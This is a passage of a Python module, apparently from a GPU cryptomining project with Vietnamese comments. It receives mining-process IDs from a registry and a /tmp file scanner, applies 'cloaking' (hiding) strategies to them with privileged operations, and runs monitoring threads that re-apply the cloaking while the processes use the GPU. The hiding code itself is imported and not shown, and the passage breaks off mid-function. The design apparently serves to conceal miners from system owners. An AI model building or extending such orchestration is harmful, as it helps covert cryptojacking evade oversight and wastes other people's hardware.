"""
GPU Resource Management System with cloaking-only architecture.

Provides centralized GPU resource management, process monitoring,
and cloaking strategy application for mining processes.
"""

import logging
import psutil
import pynvml
import traceback
import threading
import concurrent.futures
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from pathlib import Path
import os

# Core project imports
from mining_environment.scripts.utils import MiningProcess
from mining_environment.scripts.resource_control import CloakStrategyFactory
from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.scripts.unified_logging import get_unified_logger
from mining_environment.scripts.error_management import get_error_reporter
from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy

# Module logger
module_logger = get_unified_logger('resource_manager')

class SharedResourceManager:
    """
    Shared resource manager for GPU operations.
    
    Handles:
    - NVML lifecycle management
    - GPU usage monitoring
    - Cloaking strategy application
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        self.logger = get_unified_logger('resource_manager')
        self.config = config
        self.resource_managers = resource_managers
        
        # Strategy cache initialization
        self.strategy_cache = get_strategy_cache(
            max_size=500,
            ttl_seconds=7200.0,
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # Privileged operations manager
        self.privileged_manager = get_privileged_manager(logger)
        
        # Security context validation
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        # NVML initialization with decoupling - non-blocking if NVML fails
        self._nvml_init = False
        self._nvml_available = False
        
        # Try NVML initialization without throwing exceptions on failure
        try:
            self.initialize_nvml()
            self.logger.info("SharedResourceManager initialized with NVML support")
        except Exception as e:
            self.logger.warning(f"NVML unavailable: {e}")
            self.logger.info("SharedResourceManager operating in fallback mode (no NVML)")
            # Continue without raising exception - system continues with limited functionality

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self) -> None:
        """Thread-safe NVML initialization"""
        if self._nvml_init:
            return

        try:
            def nvml_init_worker():
                pynvml.nvmlInit()
                return True

            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(nvml_init_worker)
                try:
                    # Reduced timeout to prevent long blocking
                    timeout = getattr(self.config, 'nvml_init_timeout', 2.0) 
                    result = future.result(timeout=timeout)
                    if result:
                        self._nvml_init = True
                        self._nvml_available = True
                        self.logger.info("NVML initialization successful")
                except concurrent.futures.TimeoutError:
                    self.logger.warning("NVML initialization timeout")
                    raise
        except Exception as e:
            self.logger.error(f"NVML initialization failed: {e}")
            raise

    def shutdown_nvml(self):
        """**Safe NVML Shutdown** (tắt NVML an toàn)"""
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.info("NVML đã tắt")
            except Exception as e:
                self.logger.error(f"Lỗi tắt NVML: {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """**Get Process Cache Usage** (lấy cache usage của process)"""
        try:
            if not self._nvml_init:
                return 0.0
                
            process = psutil.Process(pid)
            memory_info = process.memory_info()
            return float(memory_info.rss) / (1024 * 1024)  # MB
        except Exception as e:
            self.logger.debug(f"Không thể lấy cache usage cho PID {pid}: {e}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        """**Get GPU Usage Percent** (lấy phần trăm sử dụng GPU)"""
        return self._sync_get_gpu_usage_percent(pid)

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        """**Synchronous GPU Usage Check** (kiểm tra sử dụng GPU đồng bộ)"""
        try:
            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                processes = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                
                for proc in processes:
                    if proc.pid == pid:
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        return float(utilization.gpu)
            return 0.0
        except Exception as e:
            self.logger.debug(f"Không thể lấy GPU usage cho PID {pid}: {e}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """**Apply Cloaking Strategy** (áp dụng chiến lược che giấu)"""
        try:
            # CloakStrategyFactory.create_strategy is a static method
            from .resource_control import CloakStrategyFactory
            
            # Prepare resource_managers dict
            resource_managers = {'main': self}
            
            # Call static method with all required parameters
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name=strategy_name,
                config=self.config.__dict__ if hasattr(self.config, '__dict__') else self.config,
                logger=self.logger,
                resource_managers=resource_managers,
                process_type='GPU'  # GPU-only implementation
            )
            
            if strategy:
                # Apply the strategy to the process
                result = strategy.apply(process)
                if result:
                    self.logger.info(f"✅ [TIER-1] Applied {strategy_name} successfully for PID {process.pid}")
                    
                    # Log to gpu_cloaking.log if it's a GPU strategy
                    if 'gpu' in strategy_name.lower():
                        gpu_logger = logging.getLogger('gpu_cloaking')
                        gpu_logger.info(f"✅ GPU Cloaking applied: {strategy_name} for PID {process.pid}")
                    
                    return True
                else:
                    self.logger.warning(f"⚠️ [TIER-1] Strategy {strategy_name} failed for PID {process.pid}")
                    return False
            else:
                self.logger.error(f"❌ [TIER-1] Could not create strategy {strategy_name}")
                return False
                
        except Exception as e:
            self.logger.error(f"❌ [TIER-1] Error applying strategy {strategy_name}: {e}")
            import traceback
            self.logger.debug(f"Traceback: {traceback.format_exc()}")
            return False


class ResourceManager(IResourceManager):
    """
    **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
    
    **Simplified Architecture** (kiến trúc đơn giản hóa):
    - DirectPIDRegistry Observer-Based Cloaking
    - No Process Discovery or Monitoring  
    - Thread-Safe Singleton Pattern
    """

    _instance = None
    _instance_lock = threading.Lock()
    _ready_event = threading.Event()
    _initialization_lock = threading.RLock()

    def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Singleton Creation** (tạo singleton)"""
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
                module_logger.debug("ResourceManager Singleton Created")
        return cls._instance

    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """**Initialize ResourceManager** (khởi tạo ResourceManager)"""
        if getattr(self, '_initialized', False):
            module_logger.debug("ResourceManager Singleton Already Initialized")
            return

        with self._initialization_lock:
            if getattr(self, '_initialized', False):
                return

            self.logger = get_unified_logger('resource_manager')
            self.config = self._validate_configuration(config)
            
            # **Core Components** (thành phần cốt lõi)
            self._stop_flag = False
            self.workers = []
            self.resource_adjustment_queue = queue.Queue()
            
            # **🥇 SOLUTION D: EAGER INITIALIZATION FIX** (khởi tạo eager SharedResourceManager)
            # Khởi tạo SharedResourceManager ngay lập tức để tránh race condition
            self._shared_resource_manager_lock = threading.Lock()
            self._shared_resource_manager_init_attempted = False
            
            # **🥇 SOLUTION D: Eager initialization với error handling** (khởi tạo eager với xử lý lỗi)
            try:
                self.logger.info("🔧 [EAGER-INIT] Bắt đầu khởi tạo SharedResourceManager...")
                resource_managers = {'main': self}
                self.shared_resource_manager = SharedResourceManager(
                    self.config, self.logger, resource_managers
                )
                self.logger.info("✅ [EAGER-INIT] SharedResourceManager khởi tạo thành công")
                
                # **🥇 SOLUTION D: Signal ready sau khi SharedResourceManager sẵn sàng** (báo hiệu sẵn sàng)
                self.signal_ready()
                self.logger.info("✅ [EAGER-INIT] ResourceManager đã sẵn sàng nhận PID")
                
            except Exception as e:
                self.logger.warning(f"⚠️ [EAGER-INIT] SharedResourceManager khởi tạo thất bại: {e}")
                self.logger.info("🔄 [EAGER-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
                self.shared_resource_manager = None
                # Vẫn signal ready để không block hệ thống
                self.signal_ready()
            
            # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục)
            self._pid_queue = queue.Queue()  # Queue for incoming PIDs from registry
            self._monitored_processes = {}   # Dict[int, MiningProcess] - processes under cloaking
            self._monitoring_interval = 30.0  # Monitor every 30 seconds
            self._last_monitoring_cycle = 0.0
            self._cloaking_stats = {
                'processes_cloaked': 0,
                'cloaking_attempts': 0,
                'failed_cloakings': 0,
                'monitoring_cycles': 0
            }
            
            # **🥇 SOLUTION 1: File-Based Scanner Configuration** (cấu hình scanner dựa trên file)
            self._file_scanner_enabled = True
            self._file_scanner_interval = 10.0  # Check every 10 seconds
            self._pid_file_directory = Path("/tmp/ncs_pid_registry")  # Monitor this directory
            self._last_scanner_cycle = 0.0
            self._scanner_stats = {
                'files_processed': 0,
                'pids_discovered': 0,
                'cloaking_triggered': 0,
                'scan_cycles': 0
            }
            
            # **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry)
            self._setup_direct_registry_observer()
            
            self._initialized = True
            module_logger.info("ResourceManager khởi tạo thành công")

    @classmethod
    def wait_for_ready(cls, timeout: float = 10.0) -> bool:
        """**Wait for ResourceManager Ready** (chờ ResourceManager sẵn sàng)"""
        try:
            return cls._ready_event.wait(timeout=timeout)
        except Exception as e:
            module_logger.error(f"Lỗi chờ ResourceManager ready: {e}")
            return False

    @classmethod
    def is_ready(cls) -> bool:
        """**Check if ResourceManager is Ready** (kiểm tra ResourceManager sẵn sàng)"""
        return cls._ready_event.is_set()

    @classmethod
    def signal_ready(cls):
        """**Signal ResourceManager Ready** (báo hiệu ResourceManager sẵn sàng)"""
        cls._ready_event.set()
        module_logger.info("ResourceManager Ready Signal Set")

    @classmethod
    def clear_ready_signal(cls):
        """**Clear ResourceManager Ready Signal** (xóa tín hiệu sẵn sàng)"""
        cls._ready_event.clear()
        module_logger.info("ResourceManager Ready Signal Cleared")

    def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
        """**Validate Configuration** (xác thực cấu hình)"""
        if not config:
            raise ValueError("Configuration không được None")
        
        # **Cloaking Strategies Validation** (xác thực chiến lược che giấu)
        if not hasattr(config, 'cloaking_strategies') or not config.cloaking_strategies:
            self.logger.warning("Không có cloaking strategies, sử dụng mặc định")
            
        return config

    def is_gpu_initialized(self) -> bool:
        """**Check GPU Initialization** (kiểm tra khởi tạo GPU)"""
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """**Handle Resource Adjustment** (xử lý điều chỉnh tài nguyên)"""
        try:
            self.resource_adjustment_queue.put(event_data, block=False)
        except queue.Full:
            self.logger.warning("Resource adjustment queue đầy")

    def _ensure_shared_resource_manager(self) -> bool:
        """**Lazy Initialize SharedResourceManager** (khởi tạo lười SharedResourceManager)
        
        Chỉ khởi tạo SharedResourceManager khi thực sự cần dùng.
        Sử dụng lock để tránh race condition khi nhiều thread gọi cùng lúc.
        
        Returns:
            bool: True nếu SharedResourceManager sẵn sàng, False nếu không
        """
        # Fast path: đã khởi tạo rồi
        if self.shared_resource_manager is not None:
            return True
            
        # Slow path: cần khởi tạo
        with self._shared_resource_manager_lock:
            # Double-check pattern
            if self.shared_resource_manager is not None:
                return True
                
            # Chỉ thử một lần để tránh block lâu
            if self._shared_resource_manager_init_attempted:
                return False
                
            self._shared_resource_manager_init_attempted = True
            self.logger.info("🔧 [LAZY-INIT] Bắt đầu khởi tạo SharedResourceManager...")
            
            try:
                # Thử khởi tạo với timeout ngắn
                resource_managers = {'main': self}
                self.shared_resource_manager = SharedResourceManager(
                    self.config, self.logger, resource_managers
                )
                self.logger.info("✅ [LAZY-INIT] SharedResourceManager khởi tạo thành công")
                return True
                
            except Exception as e:
                self.logger.warning(f"⚠️ [LAZY-INIT] SharedResourceManager khởi tạo thất bại: {e}")
                self.logger.info("🔄 [LAZY-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
                self.shared_resource_manager = None
                return False
    
    def _setup_direct_registry_observer(self):
        """**Setup DirectPIDRegistry Observer** (thiết lập observer DirectPIDRegistry)"""
        try:
            from pid_logger.direct_registry import get_direct_registry
            
            registry = get_direct_registry()
            
            # **SOLUTION 1: Register ResourceManager instance với DirectPIDRegistry** (đăng ký instance ResourceManager)
            if hasattr(registry, 'register_resource_manager'):
                success = registry.register_resource_manager(self)
                if success:
                    self.logger.info("✅ [SOLUTION-1] ResourceManager đã đăng ký với DirectPIDRegistry")
                else:
                    self.logger.warning("⚠️ [SOLUTION-1] Không thể đăng ký ResourceManager với DirectPIDRegistry")
            else:
                self.logger.warning("⚠️ [SOLUTION-1] DirectPIDRegistry không hỗ trợ register_resource_manager")
            
            # **Original observer registration** (đăng ký observer gốc)
            registry.register_observer(self._on_process_registered_direct)
            self.logger.info("✅ DirectPIDRegistry observer đã đăng ký")
            
        except Exception as e:
            self.logger.error(f"❌ Lỗi thiết lập DirectPIDRegistry: {e}")

    def _on_process_registered_direct(self, process_info) -> None:
        """**Handle Process Registration** (xử lý đăng ký process)"""
        try:
            self.logger.info(f"🎯 [OBSERVER-CALLBACK] _on_process_registered_direct called with process_info: {process_info}")
            
            # ProcessInfo is a dataclass, not a dict - access attributes directly
            if not hasattr(process_info, 'pid'):
                self.logger.warning("ProcessInfo missing pid attribute")
                return
                
            pid = process_info.pid
            if not pid:
                self.logger.warning(f"ProcessInfo has empty pid: {process_info}")
                return
            
            self.logger.info(f"📍 [OBSERVER-CALLBACK] Processing PID {pid} from DirectPIDRegistry")

            # **Create MiningProcess** (tạo MiningProcess)
            # Extract cmd from metadata if available, otherwise use empty list
            cmd = []
            if hasattr(process_info, 'metadata') and process_info.metadata:
                cmd = process_info.metadata.get('cmd', [])
                
            mining_process = MiningProcess(
                pid=pid,
                name=process_info.process_name if hasattr(process_info, 'process_name') else f'process_{pid}',
                cmd=cmd
            )

            # **Trigger Cloaking** (kích hoạt che giấu)
            self.logger.info(f"🚀 [OBSERVER-CALLBACK] About to trigger cloaking for PID {pid}")
            self.trigger_cloaking(mining_process, 'direct_registry')
            self.logger.info(f"✅ [OBSERVER-CALLBACK] Cloaking triggered successfully for PID {pid}")
            
        except Exception as e:
            self.logger.error(f"Lỗi xử lý process registration: {e}")

    def trigger_cloaking(self, process: MiningProcess, source: str = 'unknown') -> bool:
        """Enhanced trigger cloaking with comprehensive strategy application"""
        self.logger.info(f"🎯 [TRIGGER-CLOAKING] Called for PID {process.pid} from source: {source}")
        try:
            self.logger.info(f"Trigger cloaking called for PID {process.pid} from source: {source}")
            self.logger.info(f"Process details: name={process.name}, cmd={process.cmd}")
            
            # Ensure SharedResourceManager is available
            if not self._ensure_shared_resource_manager():
                self.logger.warning("SharedResourceManager unavailable, skipping cloaking")
                return False

            # Determine cloaking strategies for this process
            strategies = self._determine_strategies(process)
            self.logger.info(f"Determined strategies: {strategies}")
            
            if not strategies:
                self.logger.warning(f"No strategies available for PID {process.pid}")
                return False
            
            # Apply each available strategy
            return self._apply_strategies(process, strategies)
                    
        except Exception as e:
            self.logger.error(f"Error triggering cloaking for PID {process.pid}: {e}")
            import traceback
            self.logger.debug(f"Full traceback: {traceback.format_exc()}")
            return False

    def _apply_strategies(self, process: MiningProcess, strategies: List[str]) -> bool:
        """Apply cloaking strategies to the process"""
        success_count = 0
        
        for strategy_name in strategies:
            self.logger.info(f"Applying strategy: {strategy_name} for PID {process.pid}")
            
            # Check strategy availability
            if not self._is_strategy_available(strategy_name):
                self.logger.warning(f"Strategy {strategy_name} not available, skipping")
                continue
            
            try:
                success = self.shared_resource_manager.apply_cloak_strategy(strategy_name, process)
                if success:
                    success_count += 1
                    self.logger.info(f"Successfully applied {strategy_name} for PID {process.pid}")
                else:
                    self.logger.warning(f"Failed to apply {strategy_name} for PID {process.pid}")
            except Exception as strategy_error:
                self.logger.error(f"Strategy {strategy_name} error: {strategy_error}")
        
        self.logger.info(f"Cloaking summary: {success_count}/{len(strategies)} strategies successful for PID {process.pid}")
        return success_count > 0

    def _determine_strategies(self, process: MiningProcess) -> List[str]:
        """Determine appropriate cloaking strategies for the process"""
        strategies = []
        
        try:
            self.logger.debug(f"Determining strategies for process: {process.name}")
            
            # Get strategies from configuration
            if hasattr(self.config, 'cloaking_strategies'):
                # Extract enabled strategies from configuration dictionary
                if isinstance(self.config.cloaking_strategies, dict):
                    for strategy_name, strategy_config in self.config.cloaking_strategies.items():
                        if isinstance(strategy_config, dict) and strategy_config.get('enabled', True):
                            strategies.append(strategy_name)
                        elif strategy_config is True:
                            strategies.append(strategy_name)
                else:
                    # Fallback for list-based configuration
                    strategies = list(self.config.cloaking_strategies)
            else:
                strategies = ['gpu_cloaking', 'process_cloaking']
                self.logger.warning(f"No cloaking strategies in config, using defaults: {strategies}")

            # Filter strategies by availability
            available_strategies = [
                strategy for strategy in strategies 
                if self._is_strategy_available(strategy)
            ]
            
            self.logger.debug(f"Available strategies: {available_strategies}")
            return available_strategies
            
        except Exception as e:
            self.logger.error(f"Error determining strategies: {e}")
            return ['gpu_cloaking']  # Fallback to default strategy

    def _is_strategy_available(self, strategy_name: str) -> bool:
        """Check if the specified strategy is available for use"""
        try:
            # Attempt to create strategy instance to verify availability
            from .resource_control import CloakStrategyFactory
            
            # Prepare parameters for strategy creation
            resource_managers = {'main': self}
            config_data = self.config.__dict__ if hasattr(self.config, '__dict__') else self.config
            
            # Try to create strategy instance
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name=strategy_name,
                config=config_data,
                logger=self.logger,
                resource_managers=resource_managers,
                process_type='GPU'
            )
            
            return strategy is not None
            
        except Exception as e:
            self.logger.debug(f"Strategy '{strategy_name}' not available: {e}")
            return False

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """**Collect Process Metrics** (thu thập metrics của process)"""
        metrics = {
            'timestamp': time.time(),
            'pid': process.pid,
            'name': process.name
        }
        
        try:
            if self.shared_resource_manager:
                metrics['gpu_usage'] = self.shared_resource_manager.get_gpu_usage_percent(process.pid)
                metrics['cache_usage'] = self.shared_resource_manager.get_process_cache_usage(process.pid)
        except Exception as e:
            self.logger.debug(f"Lỗi thu thập metrics cho PID {process.pid}: {e}")
            
        return metrics

    def start(self):
        """**TIER 1 FIX: Enhanced ResourceManager Start** (khởi động ResourceManager nâng cao)"""
        try:
            self.logger.info("🚀 [TIER-1] Khởi động ResourceManager với enhanced initialization...")
            
            # **TIER 1 FIX: Validate prerequisites** (xác thực điều kiện tiên quyết)
            if not self.config:
                raise ValueError("Configuration missing - cannot start ResourceManager")
            
            # **🥇 CRITICAL FIX: Check if SharedResourceManager already initialized trong __init__** 
            if self.shared_resource_manager is not None:
                self.logger.info("✅ [CRITICAL] SharedResourceManager đã được khởi tạo trong __init__, skip initialization trong start()")
            else:
                # **TIER 1 FIX: Retry SharedResourceManager initialization trong start()** (thử lại khởi tạo SharedResourceManager trong start())
                self.logger.info("🔧 [TIER-1] SharedResourceManager chưa được khởi tạo, retry trong start()...")
                resource_managers = {'main': self}
                
                try:
                    self.shared_resource_manager = SharedResourceManager(
                        self.config, self.logger, resource_managers
                    )
                    self.logger.info("✅ [TIER-1] SharedResourceManager retry initialization successful")
                    
                except Exception as srm_error:
                    self.logger.error(f"❌ [TIER-1] SharedResourceManager retry initialization failed: {srm_error}")
                    raise RuntimeError(f"Failed to initialize SharedResourceManager trong start(): {srm_error}")
            
            # **TIER 1 FIX: Final Validation** (xác thực cuối cùng)
            if self.shared_resource_manager is None:
                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
            
            # **Start Worker Threads** (khởi động worker threads)
            self.logger.info("⚙️ [TIER-1] Starting worker threads...")
            self._start_workers()
            
            # **DirectPIDRegistry Observer** (DirectPIDRegistry observer đã được thiết lập trong __init__)
            # Process discovery sẽ được xử lý thông qua DirectPIDRegistry callbacks
            
            # **TIER 1 FIX: Enhanced Ready Signal with validation** (tín hiệu sẵn sàng nâng cao với xác thực)
            self.logger.info("🎯 [TIER-1] Signaling ResourceManager ready...")
            self.signal_ready()
            
            # **TIER 1 FIX: Final validation** (xác thực cuối cùng)
            if self.shared_resource_manager is None:
                raise RuntimeError("Critical validation failed: SharedResourceManager is None after initialization")
            
            self.logger.info("✅ [TIER-1] ResourceManager đã khởi động thành công với SharedResourceManager")
            self.logger.info(f"🔍 [TIER-1] SharedResourceManager status: {self.shared_resource_manager is not None}")
            
        except Exception as e:
            self.logger.error(f"❌ [TIER-1] Lỗi khởi động ResourceManager: {e}")
            self.logger.error(f"🔍 [TIER-1] SharedResourceManager status: {getattr(self, 'shared_resource_manager', 'Not initialized')}")
            raise

    def _start_workers(self):
        """**Start Worker Threads** (khởi động worker threads)"""
        # **Start Resource Adjustment Worker** (khởi động worker điều chỉnh tài nguyên)
        resource_worker = threading.Thread(
            target=self.process_resource_adjustments,
            name="ResourceAdjustmentWorker",
            daemon=True
        )
        resource_worker.start()
        self.workers.append(resource_worker)
        
        # **🥇 SOLUTION 1: Add Persistent Monitoring Thread** (thêm thread giám sát liên tục)
        monitoring_worker = threading.Thread(
            target=self._persistent_monitoring_loop,
            name="ResourceManagerMonitoring",
            daemon=True
        )
        monitoring_worker.start()
        self.workers.append(monitoring_worker)
        
        # **🥇 SOLUTION 1: Add PID Processing Thread** (thêm thread xử lý PID)
        pid_worker = threading.Thread(
            target=self._pid_processing_loop,
            name="PIDProcessingWorker",
            daemon=True
        )
        pid_worker.start()
        self.workers.append(pid_worker)
        
        # **🥇 SOLUTION 1: Add File-Based Scanner Thread** (thêm thread scanner dựa trên file)
        if self._file_scanner_enabled:
            scanner_worker = threading.Thread(
                target=self._start_pid_file_scanner,
                name="PIDFileScanner",
                daemon=True
            )
            scanner_worker.start()
            self.workers.append(scanner_worker)
            self.logger.info("✅ [SOLUTION-1] PID File Scanner worker thread started")
        
        self.logger.info(f"Worker threads đã khởi động: {len(self.workers)} threads active")

    def process_resource_adjustments(self):
        """**Process Resource Adjustments** (xử lý điều chỉnh tài nguyên)"""
        while not self._stop_flag:
            try:
                event_data = self.resource_adjustment_queue.get(timeout=1.0)
                
                # **Process Adjustment** (xử lý điều chỉnh)
                self.logger.debug(f"Xử lý resource adjustment: {event_data}")
                
                self.resource_adjustment_queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                self.logger.error(f"Lỗi xử lý resource adjustment: {e}")

    def shutdown(self):
        """**Shutdown ResourceManager** (tắt ResourceManager)"""
        self.logger.info("Tắt ResourceManager...")
        
        # **Clear Ready Signal** (xóa tín hiệu sẵn sàng)
        self.clear_ready_signal()

        # **Wait for Queue** (chờ queue)
        try:
            self.resource_adjustment_queue.join()
        except Exception as e:
            self.logger.error(f"Lỗi chờ queue: {e}")

        # **Set Stop Flag** (đặt cờ dừng)
        self._stop_flag = True

        # **Wait for Workers** (chờ workers)
        for worker in self.workers:
            try:
                worker.join(timeout=5.0)
                if worker.is_alive():
                    self.logger.warning(f"Worker {worker.name} vẫn đang chạy")
            except Exception as e:
                self.logger.error(f"Lỗi join worker {worker.name}: {e}")

        # **Shutdown NVML** (tắt NVML)
        if self.shared_resource_manager:
            try:
                self.shared_resource_manager.shutdown_nvml()
            except Exception as e:
                self.logger.error(f"Lỗi tắt NVML: {e}")

        self.logger.info("ResourceManager đã tắt")

    def receive_from_registry(self, pid: int, registry_metadata: Dict[str, Any]) -> bool:
        """
        **TIER 2 FIX: Enhanced Receive PID from DirectPIDRegistry** (nhận PID từ DirectPIDRegistry nâng cao)
        
        **Critical Interface Method** (phương thức giao diện quan trọng) cho DirectPIDRegistry → ResourceManager handoff.
        
        Args:
            pid: Process ID to apply cloaking
            registry_metadata: Metadata from DirectPIDRegistry
            
        Returns:
            bool: True if cloaking successfully triggered
        """
        try:
            self.logger.info(f"🎯 [TIER-2] receive_from_registry called for PID {pid}")
            self.logger.info(f"🔍 [TIER-2] Registry metadata keys: {list(registry_metadata.keys())}")
            
            # **🥇 CRITICAL FIX: SharedResourceManager should be available từ __init__** (SharedResourceManager nên có sẵn từ __init__)
            if not self.shared_resource_manager:
                self.logger.error(f"❌ [CRITICAL] SharedResourceManager is None trong receive_from_registry cho PID {pid} - this should not happen with __init__ initialization!")
                return False
            else:
                self.logger.info(f"✅ [CRITICAL] SharedResourceManager is available in receive_from_registry")
            
            # **TIER 2 FIX: Enhanced MiningProcess creation** (tạo đối tượng MiningProcess nâng cao)
            self.logger.info(f"🔧 [TIER-2] Creating MiningProcess object for PID {pid}")
            mining_process = MiningProcess(
                pid=pid,
                name=registry_metadata.get('name', f'process_{pid}'),
                cmd=registry_metadata.get('cmd', [])
            )
            self.logger.info(f"✅ [TIER-2] MiningProcess created: {mining_process.name}")
            
            # **TIER 2 FIX: Enhanced PID queue processing** (xử lý queue PID nâng cao)
            pid_data = {
                'pid': pid,
                'mining_process': mining_process,
                'registry_metadata': registry_metadata,
                'timestamp': time.time(),
                'source': 'direct_registry_handoff',
                'tier2_enhanced': True
            }
            
            try:
                self._pid_queue.put(pid_data, block=False)
                self.logger.info(f"✅ [TIER-2] PID {pid} queued for processing successfully")
                return True
            except queue.Full:
                self.logger.warning(f"⚠️ [TIER-2] PID queue full, processing immediately for PID {pid}")
                # **TIER 2 FIX: Enhanced immediate processing** (xử lý ngay lập tức nâng cao)
                success = self._process_pid_immediately(pid_data)
                self.logger.info(f"📊 [TIER-2] Immediate processing result for PID {pid}: {success}")
                return success
            
        except Exception as e:
            self.logger.error(f"❌ [TIER-2] Lỗi xử lý PID {pid} trong receive_from_registry: {e}")
            self.logger.error(f"🔍 [TIER-2] Registry metadata: {registry_metadata}")
            import traceback
            self.logger.error(f"📋 [TIER-2] Full traceback: {traceback.format_exc()}")
            return False

    def _persistent_monitoring_loop(self):
        """
        **🥇 SOLUTION 1: Persistent Monitoring Loop** (vòng lặp giám sát liên tục)
        
        Continuous monitoring thread thay thế one-shot initialization.
        Monitors cloaked processes và ensures cloaking effectiveness.
        """
        self.logger.info("🔄 [PERSISTENT] ResourceManager monitoring loop started")
        
        while not self._stop_flag:
            try:
                current_time = time.time()
                
                # **Monitor cloaked processes** (giám sát processes đã cloaked)
                if current_time - self._last_monitoring_cycle >= self._monitoring_interval:
                    self._execute_monitoring_cycle(current_time)
                    self._last_monitoring_cycle = current_time
                    self._cloaking_stats['monitoring_cycles'] += 1
                
                # **Health check** (kiểm tra sức khỏe)
                if len(self._monitored_processes) > 0:
                    self.logger.debug(f"🔍 [PERSISTENT] Monitoring {len(self._monitored_processes)} processes")
                
                time.sleep(5.0)  # Check every 5 seconds
                
            except Exception as e:
                self.logger.error(f"❌ [PERSISTENT] Monitoring loop error: {e}")
                time.sleep(10.0)  # Wait longer on error
        
        self.logger.info("🔚 [PERSISTENT] ResourceManager monitoring loop stopped")
    
    def _pid_processing_loop(self):
        """
        **🥇 SOLUTION 1: PID Processing Loop** (vòng lặp xử lý PID)
        
        Continuous PID processing thread.
        Processes queued PIDs từ DirectPIDRegistry và applies cloaking.
        """
        self.logger.info("🔄 [PID-PROC] PID processing loop started")
        
        while not self._stop_flag:
            try:
                # **Get PID from queue** (lấy PID từ queue)
                try:
                    pid_data = self._pid_queue.get(timeout=2.0)
                except queue.Empty:
                    continue
                
                # **Process PID** (xử lý PID)
                success = self._process_pid_immediately(pid_data)
                
                if success:
                    self.logger.info(f"✅ [PID-PROC] Successfully processed PID {pid_data['pid']}")
                else:
                    self.logger.error(f"❌ [PID-PROC] Failed to process PID {pid_data['pid']}")
                
                self._pid_queue.task_done()
                
            except Exception as e:
                self.logger.error(f"❌ [PID-PROC] Processing loop error: {e}")
                time.sleep(1.0)
        
        self.logger.info("🔚 [PID-PROC] PID processing loop stopped")
    
    def _process_pid_immediately(self, pid_data: Dict[str, Any]) -> bool:
        """
        **🥇 SOLUTION 1: Immediate PID Processing** (xử lý PID tức thì)
        
        Process a single PID immediately with cloaking application.
        """
        try:
            pid = pid_data['pid']
            mining_process = pid_data['mining_process']
            source = pid_data['source']
            
            self.logger.info(f"🎯 [IMMEDIATE] Processing PID {pid} from {source}")
            
            # **Apply cloaking** (áp dụng cloaking)
            self.trigger_cloaking(mining_process, source)
            
            # **Add to monitored processes** (thêm vào processes được giám sát)
            self._monitored_processes[pid] = mining_process
            self._cloaking_stats['processes_cloaked'] += 1
            
            self.logger.info(f"✅ [IMMEDIATE] PID {pid} cloaked and added to monitoring")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [IMMEDIATE] Failed to process PID {pid_data.get('pid', 'unknown')}: {e}")
            self._cloaking_stats['failed_cloakings'] += 1
            return False
    
    def _execute_monitoring_cycle(self, current_time: float):
        """
        **🥇 SOLUTION 1: Execute Monitoring Cycle** (thực thi chu kỳ giám sát)
        
        Run a complete monitoring cycle cho all tracked processes.
        """
        try:
            if not self._monitored_processes:
                self.logger.debug("📊 [MONITOR] No processes to monitor")
                return
            
            self.logger.info(f"📊 [MONITOR] Starting monitoring cycle for {len(self._monitored_processes)} processes")
            
            # **Check process health** (kiểm tra sức khỏe process)
            dead_pids = []
            for pid, mining_process in self._monitored_processes.items():
                try:
                    # **Verify process still exists** (kiểm tra process vẫn tồn tại)
                    import psutil
                    proc = psutil.Process(pid)
                    
                    if not proc.is_running():
                        dead_pids.append(pid)
                        self.logger.info(f"💀 [MONITOR] Process {pid} is dead, removing from monitoring")
                    else:
                        # **Collect metrics** (thu thập metrics)
                        metrics = self.collect_metrics(mining_process)
                        self.logger.debug(f"📈 [MONITOR] PID {pid} metrics: GPU={metrics.get('gpu_usage', 0):.1f}%")
                        
                        # **Re-apply cloaking if needed** (áp dụng lại cloaking nếu cần)
                        if metrics.get('gpu_usage', 0) > 0:  # Process is actively using GPU
                            self._reapply_cloaking_if_needed(mining_process)
                
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    dead_pids.append(pid)
                    self.logger.info(f"💀 [MONITOR] Process {pid} no longer accessible, removing")
                except Exception as e:
                    self.logger.warning(f"⚠️ [MONITOR] Error checking PID {pid}: {e}")
            
